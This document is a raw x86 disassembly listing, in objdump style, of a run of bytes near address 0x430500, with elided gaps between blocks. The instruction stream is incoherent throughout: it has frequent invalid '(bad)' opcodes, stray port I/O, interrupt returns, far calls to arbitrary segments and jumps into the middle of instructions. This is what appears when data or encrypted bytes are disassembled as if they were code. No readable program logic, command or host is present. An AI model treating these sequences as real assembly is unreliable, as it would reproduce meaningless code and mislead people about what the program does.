  4304c9:	adc    al,0x22
  4304cb:	setno  BYTE PTR [edi-0x41ea8266]
  4304d2:	test   al,0xd2
  4304d4:	test   DWORD PTR [esi-0x7e7bb3ee],ebx
  4304da:	add    eax,0xbfa3f715
  4304df:	in     al,0x79
  4304e1:	inc    eax
  4304e2:	adc    eax,0xe4d272d7
  4304e7:	popa   
  4304e8:	dec    eax
  4304e9:	mov    edi,0xedc31fdd
  4304ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4304ef:	pop    esp
  4304f0:	out    dx,eax
  4304f1:	not    edi
  4304f3:	iret   
  4304f4:	test   al,0x9d
  4304f6:	sub    eax,0x911f62e
  4304fb:	jbe    0x4304d3
  4304fd:	ss (bad) 
  430500:	xchg   ecx,eax
  430501:	scas   al,BYTE PTR es:[edi]
  430502:	(bad)  
  430503:	xlat   BYTE PTR ds:[ebx]
  430504:	mov    bh,0xd3
  430506:	imul   esp,DWORD PTR [edx+0x852df4e],0x37409b42
  430510:	sub    DWORD PTR [esi],0x180d8be8
  430516:	jp     0x430519
  430518:	popf   
  430519:	outs   dx,BYTE PTR ds:[esi]
  43051a:	jl     0x430587
  43051c:	sbb    ah,BYTE PTR [ebx+0x60]
  43051f:	retf   0x378a
  430522:	cli    
  430523:	mov    ds:0xc2e44715,al
  430528:	lea    esi,ds:0x7af945c6
  43052e:	ret    0xb9d7
  430531:	sbb    ch,BYTE PTR [ecx+ebp*2]
  430534:	inc    edx
  430535:	mov    edx,0x243b8a2b
  43053a:	adc    DWORD PTR [ebp+0x55],edi
  43053d:	or     eax,0x5eb7f9
	...
  4305b2:	add    BYTE PTR [eax],al
  4305b4:	ds push esi
  4305b6:	into   
  4305b7:	nop
  4305b8:	out    dx,al
  4305b9:	cwde   
  4305ba:	jle    0x4305ba
  4305bc:	xlat   BYTE PTR ds:[ebx]
  4305bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4305be:	add    cl,BYTE PTR [esi-0x7f]
  4305c1:	push   ss
  4305c2:	pushf  
  4305c3:	(bad)  
  4305c4:	cmc    
  4305c5:	std    
  4305c6:	add    DWORD PTR [eax],eax
  4305c8:	cmc    
  4305c9:	add    BYTE PTR [eax],al
  4305cb:	add    BYTE PTR [ebx+0x1c],dh
  4305ce:	mov    edx,DWORD PTR [ecx+0xb]
  4305d1:	push   edi
  4305d2:	sub    edx,DWORD PTR [esi+0x5a]
  4305d5:	and    al,dh
  4305d7:	mov    ecx,0x2f02f3de
  4305dc:	or     bl,BYTE PTR [eax-0x21]
  4305df:	jp     0x43064a
  4305e1:	fiadd  DWORD PTR [eax+0x53]
  4305e4:	ret    
  4305e5:	stc    
  4305e6:	cmp    al,0x43
  4305e8:	ss xor eax,0x827bb7fa
  4305ee:	mov    bh,0x2a
  4305f0:	lahf   
  4305f1:	xor    BYTE PTR [edx],bl
  4305f3:	adc    ebp,DWORD PTR [esi-0x78aa43ff]
  4305f9:	popf   
  4305fa:	js     0x430633
  4305fc:	mov    al,ds:0xcb41720c
  430601:	retf   
  430602:	and    al,0x6a
  430604:	add    esi,DWORD PTR [edx]
  430606:	xor    eax,0xec59cbb2
  43060b:	inc    edi
  43060c:	repz aad 0x85
  43060f:	paddsw mm5,QWORD PTR ds:0x482648cf
  430616:	xor    eax,DWORD PTR [ebx-0x48]
  430619:	icebp  
  43061a:	xor    ebx,ebp
  43061c:	inc    esi
  43061d:	xchg   esp,eax
  43061e:	das    
  43061f:	iret   
  430620:	pop    ebp
  430621:	jbe    0x4305a8
  430623:	or     al,0x2b
  430625:	sbb    DWORD PTR [ecx],esp
  430627:	and    ecx,ecx
  430629:	bound  ebp,QWORD PTR ds:0xd91069aa
  43062f:	fs dec ebp
  430631:	jnp    0x43068f
  430633:	mov    WORD PTR [ecx+0x6c],?
  430636:	sbb    al,cl
  430638:	mov    eax,0x6cbcfde3
  43063d:	jb     0x4305cb
  43063f:	sub    DWORD PTR [ebx+0x584518c3],edx
  430645:	mov    DWORD PTR [eax-0x2e2a6a1f],ebx
  43064b:	add    esp,DWORD PTR [edi+0x7e8c2fae]
  430651:	clc    
  430652:	sbb    ebp,0x413421f7
  430658:	ficom  WORD PTR [ebx+eiz*4-0x11]
  43065c:	add    eax,ebx
  43065e:	adc    BYTE PTR [ecx-0x6d32c9b3],dh
  430664:	jmp    0x430674
  430666:	cmp    eax,0xeb653afc
  43066b:	sub    esp,DWORD PTR [ecx+0x23405bbe]
  430671:	das    
  430672:	mov    cl,0x3b
  430674:	out    dx,al
  430675:	or     eax,0xf73c03e1
  43067a:	stc    
  43067b:	mov    cl,0x8e
  43067d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43067e:	fsub   DWORD PTR [esi]
  430680:	addr16 pop edx
  430682:	ins    BYTE PTR es:[edi],dx
  430683:	enter  0x648,0x93
  430687:	or     ah,al
  430689:	adc    bh,ch
  43068b:	retf   
  43068c:	push   eax
  43068d:	jmp    0x43070e
  43068f:	push   eax
  430690:	sbb    BYTE PTR ds:0x93babb12,al
  430696:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430697:	mov    BYTE PTR [ebx],al
  430699:	mov    ds:0x6b14bb8d,eax
  43069e:	fcomp  QWORD PTR [ecx]
  4306a0:	sbb    ah,BYTE PTR [edi+0x4bc5b6bb]
  4306a6:	xor    BYTE PTR [edi],dl
  4306a8:	add    ch,BYTE PTR [eax+edi*2]
  4306ab:	cmc    
  4306ac:	popa   
  4306ad:	(bad)  
  4306ae:	int3   
  4306af:	xchg   edx,eax
  4306b0:	mov    edi,0xb8d0b122
  4306b5:	out    0xae,al
  4306b7:	cmp    eax,0x52412371
  4306bc:	fwait
  4306bd:	sub    eax,0x2f7975
	...
  430732:	add    BYTE PTR [eax],al
  430734:	jno    0x4306d7
  430736:	(bad)  
  430737:	test   al,0xd6
  430739:	(bad)  
  43073a:	jg     0x430735
  43073c:	xor    dl,ah
  43073e:	(bad)  
  43073f:	or     al,0x16
  430741:	xchg   DWORD PTR [ebp+0x1feea02],ebx
  430747:	add    ch,dh
  430749:	add    BYTE PTR [eax],al
  43074b:	add    BYTE PTR [edi-0x59],bh
  43074e:	adc    dl,dl
  430750:	es stos DWORD PTR es:[edi],eax
  430752:	shl    DWORD PTR [eax+0x373d1e57],0xa6
  430759:	into   
  43075a:	lods   eax,DWORD PTR ds:[esi]
  43075b:	xchg   esi,eax
  43075c:	and    al,0x9c
  43075e:	stc    
  43075f:	js     0x430702
  430761:	lods   eax,DWORD PTR ds:[esi]
  430762:	ins    BYTE PTR es:[edi],dx
  430763:	pop    esp
  430764:	mov    edi,0x9b57eab
  430769:	dec    ebx
  43076a:	les    ecx,FWORD PTR [ebx-0x27e4b6d3]
  430770:	int3   
  430771:	scas   eax,DWORD PTR es:[edi]
  430772:	adc    eax,0x34903da
  430777:	jne    0x430740
  430779:	aaa    
  43077a:	jbe    0x4306fe
  43077c:	pushf  
  43077d:	adc    ebx,ecx
  43077f:	(bad)  
  430780:	cmp    eax,0x945a3eb3
  430785:	(bad)  
  430786:	mov    eax,ds:0x94c3b69c
  43078b:	xchg   edi,eax
  43078c:	pop    esi
  43078d:	je     0x430805
  43078f:	cmp    dl,BYTE PTR [ebx+edi*8+0x502d3d7a]
  430796:	cld    
  430797:	xchg   esi,eax
  430798:	les    edx,FWORD PTR [eax-0x6d]
  43079b:	fld    QWORD PTR [ebp+0x3c]
  43079e:	in     eax,0xbe
  4307a0:	dec    edx
  4307a1:	mov    esi,0x724bd960
  4307a6:	jmp    0x5c6dc66d
  4307ab:	push   ebx
  4307ac:	jmp    0x430823
  4307ae:	popf   
  4307af:	(bad)  [esp+eiz*4-0x1f]
  4307b3:	lods   al,BYTE PTR ds:[esi]
  4307b4:	xor    al,0x0
  4307b6:	lea    ebp,[ebp+0x327053e3]
  4307bc:	pop    ebp
  4307bd:	lods   al,BYTE PTR ds:[esi]
  4307be:	push   ss
  4307bf:	fwait
  4307c0:	dec    edx
  4307c1:	mov    ebp,0xd780631
  4307c6:	mov    al,BYTE PTR ds:0x2e2c435d
  4307cc:	pop    es
  4307cd:	xor    eax,0x41b7cf0d
  4307d2:	cmp    DWORD PTR [eax+0x45],eax
  4307d5:	mov    al,ds:0x2cad844
  4307da:	lahf   
  4307db:	push   ebx
  4307dc:	outs   dx,BYTE PTR ds:[esi]
  4307dd:	xchg   BYTE PTR [eax-0x283401c],al
  4307e3:	cmp    bl,BYTE PTR [edx-0x3b]
  4307e6:	xchg   ecx,eax
  4307e7:	adc    ebp,DWORD PTR [ebx]
  4307e9:	pop    ebx
  4307ea:	aam    0xd8
  4307ec:	xchg   ebp,eax
  4307ed:	adc    BYTE PTR [esi],bl
  4307ef:	pusha  
  4307f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4307f1:	sub    esi,DWORD PTR [eax-0x8e2bb98]
  4307f7:	js     0x43078b
  4307f9:	jae    0x430808
  4307fb:	dec    esp
  4307fc:	call   0x8b80:0x51d0ae9e
  430803:	clc    
  430804:	pop    ss
  430805:	shl    BYTE PTR [esp+edx*1+0x11],cl
  430809:	mov    DWORD PTR [edi-0x2e3ecde8],ecx
  43080f:	push   cs
  430810:	out    dx,al
  430811:	out    0xdb,eax
  430813:	and    ch,BYTE PTR [eax+0x40]
  430816:	int3   
  430817:	int3   
  430818:	sbb    esi,DWORD PTR [edi+edx*2+0x64]
  43081c:	dec    si
  43081e:	popa   
  43081f:	and    al,0x3f
  430821:	sub    al,BYTE PTR [eax+0x3720ad46]
  430827:	xor    DWORD PTR [ebp+0x51591588],edi
  43082d:	fisubr DWORD PTR [ebp+0x33]
  430830:	ret    0xb79
  430833:	stc    
  430834:	popa   
  430835:	popf   
  430836:	sar    BYTE PTR [edi+0x6d],1
  430839:	js     0x430807
  43083b:	cmp    eax,0xbf9c9bea
  430840:	mov    esi,0x0
	...
  4308b1:	add    BYTE PTR [eax],al
  4308b3:	add    BYTE PTR [esp+esi*2],dl
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	cmp    ebx,ebp
  4308c2:	enter  0xdf5d,0xff
  4308c6:	add    DWORD PTR [eax],eax
  4308c8:	cmc    
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    bl,dh
  4308cd:	lea    esp,ds:0x8b7630b8
  4308d3:	rol    DWORD PTR [ebx+0x6a79e52b],cl
  4308d9:	lods   al,BYTE PTR ds:[esi]
  4308da:	pop    ecx
  4308db:	aam    0x38
  4308dd:	pop    esp
  4308de:	xchg   ecx,eax
  4308df:	call   0x15da:0x146731e5
  4308e6:	jns    0x4308db
  4308e8:	jno    0x430941
  4308ea:	xor    DWORD PTR ds:[esi-0x7b],ecx
  4308ee:	inc    edx
  4308ef:	sbb    esp,DWORD PTR [ebx]
  4308f1:	cmp    al,0xe1
  4308f3:	stc    
  4308f4:	or     DWORD PTR [edx+eax*4-0x57530be3],edi
  4308fb:	sbb    BYTE PTR [edi-0x17064d9],cl
  430901:	pop    esi
  430902:	cmc    
  430903:	pop    edx
  430904:	lock sub edx,edx
  430907:	dec    esi
  430908:	jo     0x4308d7
  43090a:	add    DWORD PTR [edx-0x6f13f630],edx
  430910:	mov    ah,0xfd
  430912:	sub    BYTE PTR [edx-0x6898a17b],bh
  430918:	pop    ebp
  430919:	pop    esp
  43091a:	sub    ch,dl
  43091c:	xor    eax,0x1f27548
  430921:	xor    eax,0x7d50e2d8
  430926:	out    0xee,al
  430928:	jge    0x4308e2
  43092a:	sub    al,0x9f
  43092c:	fiadd  DWORD PTR [ebp+0xc]
  43092f:	fidiv  DWORD PTR [edi]
  430931:	scas   eax,DWORD PTR es:[edi]
  430932:	lods   eax,DWORD PTR ds:[esi]
  430933:	dec    ecx
  430934:	inc    esi
  430935:	scas   al,BYTE PTR es:[edi]
  430936:	cli    
  430937:	(bad)  
  430939:	xor    esp,DWORD PTR [edi]
  43093b:	test   ebx,0x3f866481
  430941:	retf   0xaa62
  430944:	xor    BYTE PTR [edi-0x7a50a550],ah
  43094a:	nop
  43094b:	push   0x46
  43094d:	sbb    DWORD PTR [edx],ecx
  43094f:	iret   
  430950:	enter  0x2700,0x52
  430954:	add    ch,0x50
  430957:	retf   0x4d59
  43095a:	xchg   edx,eax
  43095b:	dec    ecx
  43095c:	mov    ds,edx
  43095e:	mov    bh,0xe7
  430960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430961:	out    0x93,eax
  430963:	jns    0x4309ac
  430965:	in     al,0xf8
  430967:	popa   
  430968:	inc    edx
  430969:	or     eax,0x900385df
  43096e:	iret   
  43096f:	std    
  430970:	dec    ebp
  430971:	sti    
  430972:	push   ebp
  430973:	je     0x4308f9
  430975:	bound  esp,QWORD PTR [ebx-0x6]
  430978:	fst    DWORD PTR [eax+0x1f]
  43097b:	jne    0x430951
  43097d:	sub    ch,bl
  43097f:	push   ecx
  430980:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430981:	xor    BYTE PTR [ecx+0x28],ch
  430984:	arpl   sp,ax
  430986:	cmp    al,0x80
  430988:	outs   dx,DWORD PTR ds:[esi]
  430989:	or     ebp,edx
  43098b:	in     al,0x9d
  43098d:	std    
  43098e:	rcl    DWORD PTR [edi-0x3f],1
  430991:	(bad)  
  430992:	cld    
  430993:	outs   dx,DWORD PTR ds:[esi]
  430994:	iret   
  430995:	cmp    eax,0x91ad3ee5
  43099a:	pop    eax
  43099b:	push   0xbb9c0583
  4309a0:	jb     0x4309d7
  4309a2:	or     edx,ebx
  4309a4:	test   BYTE PTR [ebp-0x21],0x3c
  4309a8:	add    bl,ah
  4309aa:	add    bl,bh
  4309ac:	add    eax,DWORD PTR [esi]
  4309ae:	ss out dx,eax
  4309b0:	es adc al,0xd8
  4309b3:	std    
  4309b4:	ins    BYTE PTR es:[edi],dx
  4309b5:	repz sahf 
  4309b7:	mov    ch,0x7f
  4309b9:	adc    eax,0x72f6f0d7
  4309be:	push   0xffffff8d
  4309c0:	mov    esp,0x0
	...
  430a31:	add    BYTE PTR [eax],al
  430a33:	add    BYTE PTR [ebx],bl
  430a35:	out    dx,eax
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0x1e431737
  430a43:	test   eax,0x200d4
  430a48:	cmc    
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    BYTE PTR [esi],bh
  430a4d:	pop    ds
  430a4e:	sbb    BYTE PTR [ebx-0x50],dh
  430a51:	mov    edi,0x9edc5648
  430a56:	cmp    al,BYTE PTR [edx+eax*8]
  430a59:	cmp    al,0xbf
  430a5b:	sti    
  430a5c:	pop    ecx
  430a5d:	je     0x4309ea
  430a5f:	adc    al,0xc5
  430a61:	rcr    DWORD PTR [edx],0x76
  430a64:	out    dx,al
  430a65:	(bad)  
  430a66:	in     eax,dx
  430a67:	shl    BYTE PTR [ecx+0x3cfe8607],cl
  430a6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430a6e:	ret    0x34c2
  430a71:	push   eax
  430a72:	inc    ebp
  430a73:	xor    BYTE PTR [esi-0x3d],bh
  430a76:	arpl   WORD PTR [ecx-0x53],cx
  430a79:	iret   
  430a7a:	dec    ecx
  430a7b:	js     0x430aeb
  430a7d:	pusha  
  430a7e:	jle    0x430a66
  430a80:	(bad)  
  430a81:	jne    0x430a56
  430a83:	scas   al,BYTE PTR es:[edi]
  430a84:	sbb    al,0x23
  430a86:	jmp    0x430a1e
  430a88:	push   es
  430a89:	push   ds
  430a8a:	sbb    ch,BYTE PTR [esi+esi*2-0x4d]
  430a8e:	(bad)  
  430a90:	and    BYTE PTR ds:0x48fee6e8,bh
  430a96:	add    al,0x8a
  430a98:	shl    BYTE PTR [esi+0x15],0xd
  430a9c:	mov    cl,0x21
  430a9e:	dec    edx
  430a9f:	add    ah,BYTE PTR [eax+0x67]
  430aa2:	ss push eax
  430aa4:	fcmovnbe st,st(1)
  430aa6:	ret    
  430aa7:	sahf   
  430aa8:	cld    
  430aa9:	jnp    0x430aa6
  430aab:	retf   
  430aac:	in     al,dx
  430aad:	clc    
  430aae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430aaf:	push   esi
  430ab0:	mov    dl,0xb0
  430ab2:	push   esp
  430ab3:	fisub  WORD PTR [eax-0x4d]
  430ab6:	in     eax,dx
  430ab7:	xchg   esi,eax
  430ab8:	(bad)  
  430ab9:	in     eax,dx
  430aba:	test   al,0x17
  430abc:	mov    ah,0x84
  430abe:	or     al,0x58
  430ac0:	je     0x430a61
  430ac2:	shr    BYTE PTR [ecx],1
  430ac4:	ror    DWORD PTR [esi-0x40e95966],0xd6
  430acb:	popf   
  430acc:	aaa    
  430acd:	imul   BYTE PTR [edi-0x56]
  430ad0:	sub    cl,BYTE PTR [esi]
  430ad2:	mov    cl,0x21
  430ad4:	imul   eax,DWORD PTR [ecx],0x1e
  430ad7:	lock pop esi
  430ad9:	push   es
  430ada:	pop    ebx
  430adb:	xchg   esp,eax
  430adc:	push   cs
  430add:	lahf   
  430ade:	push   edi
  430adf:	jb     0x430b2f
  430ae1:	sub    eax,esi
  430ae3:	(bad)  
  430ae5:	jns    0x430aa3
  430ae7:	lods   eax,DWORD PTR ds:[esi]
  430ae8:	loop   0x430aff
  430aea:	sbb    edi,DWORD PTR [ecx+0xd]
  430aed:	push   0x25
  430aef:	es iret 
  430af1:	cmp    edi,DWORD PTR [ebx]
  430af3:	jae    0x430a98
  430af5:	mov    ebp,0x7804f901
  430afa:	pop    edx
  430afb:	dec    eax
  430afc:	stos   BYTE PTR es:[edi],al
  430afd:	pusha  
  430afe:	je     0x430a9f
  430b00:	(bad)  
  430b01:	jb     0x430ad3
  430b03:	and    DWORD PTR [eax],0xe3f6f995
  430b09:	nop
  430b0a:	leave  
  430b0b:	shl    BYTE PTR [edx+0x3c],1
  430b0e:	stos   DWORD PTR es:[edi],eax
  430b0f:	push   es
  430b10:	and    eax,0x316cb2cb
  430b15:	add    eax,0xbbf9b3d5
  430b1a:	inc    esi
  430b1b:	bound  eax,QWORD PTR [esi-0x3e5761f9]
  430b21:	add    DWORD PTR [edx+ecx*4-0x357fa6e0],ebx
  430b28:	mov    ecx,0xf3db63d
  430b2d:	cmp    DWORD PTR [esi],esp
  430b2f:	sub    ebp,DWORD PTR [ecx+0x38e6ef5b]
  430b35:	mov    DWORD PTR [edx+0x76],esi
  430b38:	inc    eax
  430b39:	add    al,0x33
  430b3b:	das    
  430b3c:	mov    ah,0x3c
  430b3e:	push   ebp
  430b3f:	pop    ebx
  430b40:	lods   al,BYTE PTR ds:[esi]
	...
  430bb1:	add    BYTE PTR [eax],al
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0xc0ea:0x3f4217e6
  430bc2:	jp     0x430b91
  430bc4:	leave  
  430bc5:	add    DWORD PTR [edx],eax
  430bc7:	add    ch,dh
  430bc9:	add    BYTE PTR [eax],al
  430bcb:	add    ch,bl
  430bcd:	inc    edi
  430bce:	xchg   ebp,esp
  430bd0:	xchg   esi,eax
  430bd1:	les    esi,FWORD PTR [ebp-0x2]
  430bd4:	adc    DWORD PTR [edx-0x6628b732],ecx
  430bda:	addr16 pop ebx
  430bdc:	sub    al,0x4
  430bde:	div    DWORD PTR [eax-0x34]
  430be1:	addr16 push 0xffffff99
  430be4:	jmp    0x430c46
  430be6:	pop    ecx
  430be7:	push   ds
  430be8:	scas   al,BYTE PTR es:[edi]
  430be9:	push   ss
  430bea:	xchg   ebp,eax
  430beb:	jnp    0x430bf0
  430bed:	add    ch,cl
  430bef:	mov    ebx,0x3ae529db
  430bf4:	loop   0x430c60
  430bf6:	retf   
  430bf7:	add    ah,0x16
  430bfa:	cmp    eax,DWORD PTR [eax-0x6299a0e5]
  430c00:	sub    eax,0x257010e2
  430c05:	dec    edx
  430c06:	cwde   
  430c07:	cli    
  430c08:	sahf   
  430c09:	pop    edi
  430c0a:	push   ebx
  430c0b:	mov    eax,0x3a3ac1b2
  430c10:	jno    0x430c58
  430c12:	in     al,0x8a
  430c14:	aad    0x34
  430c16:	push   ebx
  430c17:	push   cs
  430c18:	jecxz  0x430be3
  430c1a:	js     0x430bef
  430c1c:	test   BYTE PTR [ecx-0x4c94121d],al
  430c22:	mov    WORD PTR [ecx-0x32167be9],gs
  430c28:	inc    edi
  430c29:	mov    edx,0xc1667dd0
  430c2e:	hlt    
  430c2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c30:	call   0xb87882a6
  430c35:	rcr    DWORD PTR [edi-0x3],0x45
  430c39:	jl     0x430c21
  430c3b:	dec    ebx
  430c3c:	or     al,0x53
  430c3e:	sbb    eax,0x3732eb1b
  430c43:	rcl    dl,0x8b
  430c46:	add    bh,BYTE PTR ds:0xcca59846
  430c4c:	lods   al,BYTE PTR ds:[esi]
  430c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c4e:	ins    BYTE PTR es:[edi],dx
  430c4f:	int3   
  430c50:	ja     0x430c9d
  430c52:	imul   esi,edi,0x67
  430c55:	lock dec ebp
  430c57:	ins    DWORD PTR es:[edi],dx
  430c58:	cli    
  430c59:	or     BYTE PTR ds:0x19bfa00,dl
  430c5f:	outs   dx,DWORD PTR ds:[esi]
  430c60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c61:	rcl    dh,1
  430c63:	and    esp,DWORD PTR [edx-0x4a1d921a]
  430c69:	fs jge 0x430c8d
  430c6c:	in     eax,dx
  430c6d:	dec    eax
  430c6e:	loopne 0x430c80
  430c70:	test   DWORD PTR [ebx+0x73],ebx
  430c73:	test   BYTE PTR [esi+0x13427125],dl
  430c79:	mov    bl,BYTE PTR [edi+edi*1]
  430c7c:	fwait
  430c7d:	bound  edx,QWORD PTR [eax+0x4b]
  430c80:	pop    ebx
  430c81:	sub    DWORD PTR [eax],ecx
  430c83:	push   ss
  430c84:	mov    dh,BYTE PTR [ecx+0x17]
  430c87:	out    0x7a,al
  430c89:	addr16 inc ebp
  430c8b:	inc    ebp
  430c8c:	push   ds
  430c8d:	data16 jnp 0x430c48
  430c90:	pop    es
  430c91:	lds    esi,FWORD PTR [ecx-0x1d263b74]
  430c97:	push   esi
  430c98:	push   ebp
  430c99:	js     0x430d11
  430c9b:	cld    
  430c9c:	jbe    0x430cec
  430c9e:	iret   
  430c9f:	mov    ds:0xd3e81e9f,eax
  430ca4:	neg    BYTE PTR [esp+eax*8-0xa]
  430ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430ca9:	call   DWORD PTR [ebp+ebx*4-0x14ab1ae5]
  430cb0:	aas    
  430cb1:	jbe    0x430cfa
  430cb3:	push   0x504d3f96
  430cb8:	push   ebx
  430cb9:	in     al,dx
  430cba:	add    cl,BYTE PTR [ebx-0x28d144f5]
  430cc0:	sbb    al,0x0
	...
  430d32:	add    BYTE PTR [eax],al
  430d34:	dec    eax
  430d35:	rol    dl,0xf0
  430d38:	retf   0x7af2
  430d3b:	clc    
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d4e
  430d41:	mov    al,ds:0x2bea340
  430d46:	add    al,BYTE PTR [eax]
  430d48:	cmc    
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [edi],dl
  430d4d:	jl     0x430cf2
  430d4f:	xor    al,0x62
  430d51:	popf   
  430d52:	push   ebp
  430d53:	xchg   esp,eax
  430d54:	inc    eax
  430d55:	cmp    ebp,DWORD PTR [eax-0x535abf5c]
  430d5b:	gs or  al,0x58
  430d5e:	push   esi
  430d5f:	add    BYTE PTR [edi+0x792295b7],0x23
  430d66:	call   0xc99d:0x28440ad9
  430d6d:	iret   
  430d6e:	inc    edx
  430d6f:	inc    ecx
  430d70:	mov    eax,0x5512630
  430d75:	sahf   
  430d76:	or     ebx,DWORD PTR [esi+eiz*8-0x5d7ea1fe]
  430d7d:	ror    eax,0xa8
  430d80:	lods   eax,DWORD PTR ds:[esi]
  430d81:	sbb    al,0xa
  430d83:	js     0x430de1
  430d85:	les    edx,FWORD PTR [ebx+0x407991f4]
  430d8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430d8c:	jnp    0x430d18
  430d8e:	pop    ecx
  430d8f:	leave  
  430d90:	push   0x2b
  430d92:	add    DWORD PTR [edx-0x4ec84baa],0x7f227829
  430d9c:	(bad)  
  430d9d:	bound  ebp,QWORD PTR [edi+ebx*8-0x44]
  430da1:	pop    ds
  430da2:	mov    esp,0x70374b0
  430da7:	sbb    DWORD PTR [esi-0x4331c270],esp
  430dad:	or     BYTE PTR [eax+eax*2],dl
  430db0:	mov    bh,0xcf
  430db2:	outs   dx,DWORD PTR ds:[esi]
  430db3:	ss xor eax,edi
  430db6:	test   eax,0xfc077301
  430dbb:	push   edi
  430dbc:	cmp    BYTE PTR [ecx+0x6e],0xc7
  430dc0:	jbe    0x430dff
  430dc2:	in     eax,dx
  430dc3:	cmc    
  430dc4:	and    bl,ah
  430dc6:	ins    BYTE PTR es:[edi],dx
  430dc7:	les    edx,FWORD PTR [ebp+0x30]
  430dca:	enter  0xae83,0x5f
  430dce:	pop    esp
  430dcf:	outs   dx,DWORD PTR ds:[esi]
  430dd0:	(bad)  
  430dd1:	dec    esp
  430dd2:	enter  0x864,0x34
  430dd6:	xor    al,0x1e
  430dd8:	(bad)  
  430dd9:	neg    ebx
  430ddb:	add    al,0xb3
  430ddd:	sub    bh,BYTE PTR [esi+0x7dda33b9]
  430de3:	test   BYTE PTR [esi-0x5d],bh
  430de6:	sub    eax,0xe5a68982
  430deb:	in     al,0x8a
  430ded:	std    
  430dee:	ret    0x120c
  430df1:	add    cl,ah
  430df3:	stos   DWORD PTR es:[edi],eax
  430df4:	xor    dl,BYTE PTR [ebx-0x1b]
  430df7:	unpcklps xmm7,XMMWORD PTR [edx]
  430dfa:	ret    
  430dfb:	lahf   
  430dfc:	ret    0xc362
  430dff:	mov    eax,0x796cd19e
  430e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430e05:	jge    0x430e0c
  430e07:	fst    QWORD PTR [ebp-0x1ea24b0c]
  430e0d:	xor    eax,0x495b7b1b
  430e12:	enter  0xf0ac,0xca
  430e16:	lds    esp,FWORD PTR [ebx+0x22]
  430e19:	(bad)  
  430e1b:	jle    0x430dfc
  430e1d:	pop    ss
  430e1e:	adc    esi,DWORD PTR [esi-0x7646c9fd]
  430e24:	js     0x430da6
  430e26:	push   cs
  430e27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430e28:	jl     0x430e2b
  430e2a:	cdq    
  430e2b:	arpl   WORD PTR [ecx-0x70bb4382],bx
  430e31:	(bad)  
  430e33:	and    bh,BYTE PTR [ecx+0x58]
  430e36:	cwde   
  430e37:	adc    esp,DWORD PTR [edi-0x5f5a9379]
  430e3d:	imul   eax,ecx,0xffffffd7
  430e40:	inc    ebp
	...
  430eb1:	add    BYTE PTR [eax],al
  430eb3:	add    BYTE PTR [edi+eiz*2],al
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430e72
  430ec1:	xchg   esi,eax
  430ec2:	mov    ds:0x203b368,eax
  430ec7:	add    ch,dh
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    dh,bl
  430ecd:	sti    
  430ece:	and    esi,DWORD PTR [esi]
  430ed0:	loopne 0x430e65
  430ed2:	push   cs
  430ed3:	lods   eax,DWORD PTR ds:[esi]
  430ed4:	sub    al,0x58
  430ed6:	or     bh,BYTE PTR [ebp-0x2]
  430ed9:	sti    
  430eda:	mov    ecx,ss
  430edc:	sets   BYTE PTR [edx-0x28443ca0]
  430ee3:	in     al,dx
  430ee4:	loopne 0x430f64
  430ee6:	xor    al,0x8
  430ee8:	fsub   DWORD PTR [edi-0x3a]
  430eeb:	clc    
  430eec:	out    0x96,al
  430eee:	add    ecx,0x84aca096
  430ef4:	ins    DWORD PTR es:[edi],dx
  430ef5:	inc    edx
  430ef6:	cli    
  430ef7:	mov    ah,0x71
  430ef9:	jmp    0x502d66c1
  430efe:	stos   BYTE PTR es:[edi],al
  430eff:	sub    ebx,DWORD PTR [edx+edx*8-0x5e]
  430f03:	test   DWORD PTR [ebp-0x6cbaaf06],0x9e48dc36
  430f0d:	cdq    
  430f0e:	xor    al,0x4b
  430f10:	add    BYTE PTR [eax+0x5e],bl
  430f13:	test   bl,bh
  430f15:	mov    al,0xd8
  430f17:	jo     0x430f2e
  430f19:	adc    al,0x55
  430f1b:	cdq    
  430f1c:	cmc    
  430f1d:	retf   0xf800
  430f20:	mul    edi
  430f22:	jno    0x430ee7
  430f24:	sbb    DWORD PTR [eax+ebp*1],eax
  430f27:	jne    0x430f99
  430f29:	nop
  430f2a:	addr16 retf 
  430f2c:	test   BYTE PTR [esi-0x6a],cl
  430f2f:	fcmove st,st(7)
  430f31:	test   BYTE PTR [eax-0x2f],ah
  430f34:	push   esp
  430f35:	jne    0x430f50
  430f37:	sbb    ch,BYTE PTR [eax+0x1a]
  430f3a:	push   esp
  430f3b:	and    edx,esp
  430f3d:	and    DWORD PTR [esi-0x4badca27],esi
  430f43:	mov    edx,0x744fd1af
  430f48:	clc    
  430f49:	jmp    0x430f2f
  430f4b:	dec    esp
